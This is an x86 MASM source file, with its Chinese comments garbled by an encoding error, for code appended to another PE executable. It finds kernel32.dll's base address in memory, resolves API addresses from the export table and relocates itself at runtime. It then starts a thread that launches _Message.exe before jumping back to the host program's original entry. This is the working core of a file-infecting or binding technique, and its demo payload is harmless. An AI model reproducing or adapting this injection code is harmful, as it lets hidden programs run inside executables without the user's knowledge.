;-------------------------
; һ�θ��ӵ�����PE�ļ���С����
; ���δ���ʹ����API������ַ��̬��ȡ�Լ��ض�λ����
; �����ܣ�ʵ��_Message.exe������
; ���ߣ�����
; �������ڣ�2010.6.30
;-------------------------

    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc
include    user32.inc
includelib user32.lib
include    kernel32.inc
includelib kernel32.lib



_ProtoGetProcAddress  typedef proto :dword,:dword
_ProtoLoadLibraryA     typedef proto :dword
_ProtoCreateDirectoryA typedef proto :dword,:dword
_ProtoCreateProcessA   typedef PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
_ProtoTerminateProcess typedef PROTO :DWORD,:DWORD
_ProtoCreateThread    typedef PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
_ProtoGetStartupInfoA typedef PROTO :DWORD
_ProtoCloseHandle     typedef PROTO :DWORD
_ProtoWaitForSingleObject typedef PROTO :DWORD,:DWORD


_ApiGetProcAddress    typedef ptr _ProtoGetProcAddress
_ApiLoadLibraryA       typedef ptr _ProtoLoadLibraryA
_ApiCreateDirectoryA  typedef ptr _ProtoCreateDirectoryA
_ApiCreateProcessA    typedef ptr _ProtoCreateProcessA
_ApiTerminateProcess  typedef ptr _ProtoTerminateProcess
_ApiCreateThread      typedef ptr _ProtoCreateThread
_ApiGetStartupInfoA   typedef ptr _ProtoGetStartupInfoA
_ApiCloseHandle       typedef ptr _ProtoCloseHandle
_ApiWaitForSingleObject typedef ptr _ProtoWaitForSingleObject


;����ӵ�Ŀ���ļ��Ĵ�������￪ʼ����APPEND_CODE_END������

    .code

jmp _NewEntry


szGetProcAddress  db  'GetProcAddress',0
szLoadLibraryA      db  'LoadLibraryA',0
szCreateDirectoryA    db  'CreateDirectoryA',0   ;�÷�����kernel32.dll��
szCreateProcessA   db 'CreateProcessA',0
szTerminateProcess db 'TerminateProcess',0
szCreateThread     db 'CreateThread',0
szGetStartupInfoA  db 'GetStartupInfoA',0
szCloseHandle      db 'CloseHandle',0
szWaitForSingleObject db 'WaitForSingleObject',0

_CreateDirectoryA _ApiCreateDirectoryA ?
_CreateProcessA  _ApiCreateProcessA ?
_TerminateProcess _ApiTerminateProcess ?
_GetStartupInfoA  _ApiGetStartupInfoA ?
_CloseHandle  _ApiCloseHandle ?
_WaitForSingleObject  _ApiWaitForSingleObject ?
_CreateThread  _ApiCreateThread  ?
_GetProcAddress _ApiGetProcAddress ?
_LoadLibraryA   _ApiLoadLibraryA  ?


szDir          db  'c:\\BBBN',0           ;Ҫ������Ŀ¼
szExeFile      db  '_Message.exe',0       ;Ҫ���еĳ���

hRunThread     dd ?
hKernel32Base  dd ?              ;���kernel32.dll��ַ
hUser32Base    dd ?


stStartUp	STARTUPINFO		<?>
stProcInfo	PROCESS_INFORMATION	<?> 

;�ô�����ֵ�ǿ�ִ���ļ�_Message.exe�����ݣ�


;-----------------------------
; ���� Handler
;-----------------------------------------
_SEHHandler proc _lpException,_lpSEH,_lpContext,_lpDispatcher
  pushad
  mov esi,_lpException
  mov edi,_lpContext
  assume esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT
  mov eax,_lpSEH
  push [eax+0ch]
  pop [edi].regEbp
  push [eax+8]
  pop [edi].regEip
  push eax
  pop [edi].regEsp
  assume esi:nothing,edi:nothing
  popad
  mov eax,ExceptionContinueExecution
  ret
_SEHHandler endp

;-------------------------------------------
; ���ڴ���ɨ�� Kernel32.dll �Ļ�ַ
; ��ָ���Ļ�ַ����ߵ�ַ������
;-------------------------------------------

_getKernelBase proc _dwKernelRet
  local @dwReturn
  
  pushad
  mov @dwReturn,0

  ;�ض�λ
  call @F
@@:
  pop ebx
  sub ebx,offset @B

  ;�������ڴ������SEH�ṹ
  assume fs:nothing
  push ebp
  lea eax,[ebx+offset _ret]
  push eax
  lea eax,[ebx+offset _SEHHandler]
  push eax
  push fs:[0]
  mov fs:[0],esp

  ;����kernel32.dll�Ļ�ַ
  mov edi,_dwKernelRet
  and edi,0ffff0000h   ;�ҵ����ص�ַ���ڴ�����ͷ
  .while TRUE
    .if word ptr [edi]==IMAGE_DOS_SIGNATURE
      mov esi,edi
      add esi,[esi+3ch]
      .if word ptr [esi]==IMAGE_NT_SIGNATURE
        mov @dwReturn,edi
        .break
      .endif
    .endif
_ret:
    sub edi,010000h             ;����һ���ڴ�ҳ�棬��������
    .break .if edi<070000000h   ;ֱ����ַС��070000000h
  .endw  
  pop fs:[0]
  add esp,0ch
  popad
  mov eax,@dwReturn
  ret
_getKernelBase endp

;------------------------------------------------
; ���ڴ���ģ��ĵ������л�ȡĳ�� API ����ڵ�ַ
;------------------------------------------------
_getApi  proc  _hModule,_lpszApi
  local @dwReturn,@dwStringLen
  
  pushad
  mov @dwReturn,0
  call @F
@@:
  pop ebx
  sub ebx,offset @B

  ;�������ڴ������SEH�ṹ
  assume fs:nothing
  push ebp
  lea eax,[ebx+offset _ret]
  push eax
  lea eax,[ebx+offset _SEHHandler]
  push eax
  push fs:[0]
  mov fs:[0],esp

  ;����API�ַ����ĳ��ȣ�ע���β����0��
  mov edi,_lpszApi
  mov ecx,-1
  xor al,al
  cld
  repnz scasb
  mov ecx,edi
  sub ecx,_lpszApi
  mov @dwStringLen,ecx
  ;��DLL�ļ�ͷ������Ŀ¼�л�ȡ�������λ��
  mov esi,_hModule
  add esi,[esi+3ch]
  assume esi:ptr IMAGE_NT_HEADERS
  mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
  add esi,_hModule
  assume esi:ptr IMAGE_EXPORT_DIRECTORY
  mov ebx,[esi].AddressOfNames
  add ebx,_hModule
  xor edx,edx
  .repeat
    push esi
    mov edi,[ebx]
    add edi,_hModule
    mov esi,_lpszApi
    mov ecx,@dwStringLen
    repz cmpsb
    .if ZERO?
      pop esi
      jmp @F
    .endif
    pop esi
    add ebx,4
    inc edx
  .until edx>=[esi].NumberOfNames
  jmp _ret
@@:
  ;API��������->�������->��ַ����
  sub ebx,[esi].AddressOfNames
  sub ebx,_hModule
  shr ebx,1
  add ebx,[esi].AddressOfNameOrdinals
  add ebx,_hModule
  movzx eax,word ptr [ebx]
  shl eax,2
  add eax,[esi].AddressOfFunctions
  add eax,_hModule
  ;�ӵ�ַ��õ�����������ַ
  mov eax,[eax]
  add eax,_hModule
  mov @dwReturn,eax
_ret:
  pop fs:[0]
  add esp,0ch
  assume esi:nothing
  popad
  mov eax,@dwReturn
  ret
_getApi  endp

;------------------------------------------
; ִ�г����õ��߳�
; 1. �� CreateProcess ��������
; 2. �� WaitForSingleOject �ȴ����̽���
;-------------------------------------------
_RunThread  proc  uses ebx ecx edx esi edi,\
                                        dwParam:DWORD


    call @F   ; ��ȥ�ض�λ
@@:
    pop ebx
    sub ebx,offset @B

    pushad
    mov eax,offset stStartUp
    add eax,ebx
    push eax
    mov edx,dword ptr [ebx+_GetStartupInfoA]
    call edx

    mov eax,offset szExeFile
    add eax,ebx
    mov ecx,offset stStartUp
    add ecx,ebx
    mov edx,offset stProcInfo
    add edx,ebx
    push edx
    push ecx
    push NULL
    push NULL
    push NORMAL_PRIORITY_CLASS
    push NULL
    push NULL
    push NULL
    push eax
    push NULL
    mov edx,dword ptr [ebx+_CreateProcessA]
    call edx
    .if   eax!=0
       push INFINITE
       push [ebx+stProcInfo].hProcess
       mov edx,dword ptr [ebx+_WaitForSingleObject]
       call edx

       push [ebx+stProcInfo].hProcess
       mov edx,dword ptr [ebx+_CloseHandle]
       call edx
     
       push [ebx+stProcInfo].hThread
       mov edx,dword ptr [ebx+_CloseHandle]
       call edx
    .endif
    popad
    ret
_RunThread  endp

_getAllAPIs  proc
    pushad
    ;ʹ��GetProcAddress��������ַ������������������GetProcAddress���������CreateDirA����ַ
    nop
    mov eax,offset szCreateDirectoryA
    add eax,ebx
    push eax
    push [ebx+hKernel32Base]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_CreateDirectoryA],eax

    mov eax,offset szGetStartupInfoA
    add eax,ebx
    push eax
    push [ebx+hKernel32Base]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_GetStartupInfoA],eax

    mov eax,offset szTerminateProcess
    add eax,ebx
    push eax
    push [ebx+hKernel32Base]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_TerminateProcess],eax


    mov eax,offset szCreateThread
    add eax,ebx
    push eax
    push [ebx+hKernel32Base]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_CreateThread],eax


    mov eax,offset szCloseHandle
    add eax,ebx
    push eax
    push [ebx+hKernel32Base]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_CloseHandle],eax

    mov eax,offset szWaitForSingleObject
    add eax,ebx
    push eax
    push [ebx+hKernel32Base]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_WaitForSingleObject],eax

    mov eax,offset szCreateProcessA
    add eax,ebx
    push eax
    push [ebx+hKernel32Base]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_CreateProcessA],eax
    
    popad
    ret
_getAllAPIs  endp
_start  proc

    pushad

    ;��ȡkernel32.dll�Ļ���ַ
    invoke _getKernelBase,eax
    mov dword ptr [ebx+hKernel32Base],eax

    ;�ӻ���ַ��������GetProcAddress��������ַ
    mov eax,offset szGetProcAddress
    add eax,ebx

    mov ecx,dword ptr [ebx+hKernel32Base]
    invoke _getApi,ecx,eax
    mov dword ptr [ebx+_GetProcAddress],eax


    invoke _getAllAPIs

    
    ;�����³���
    mov eax,offset hRunThread
    add eax,ebx
    push eax
    push NULL
    push NULL
    mov eax,offset _RunThread
    add eax,ebx
    push eax
    push NULL
    push NULL
    mov edx,dword ptr [ebx+_CreateThread]
    call edx

    popad
    ret
_start  endp

; EXE�ļ��µ���ڵ�ַ

_NewEntry:
    ;ȡ��ǰ�����Ķ�ջջ��ֵ
    mov eax,dword ptr [esp]
    push eax
    call @F   ; ��ȥ�ض�λ
@@:
    pop ebx
    sub ebx,offset @B
    pop eax
    invoke _start
    jmpToStart   db 0E9h,0F0h,0FFh,0FFh,0FFh
    ret
    end _NewEntry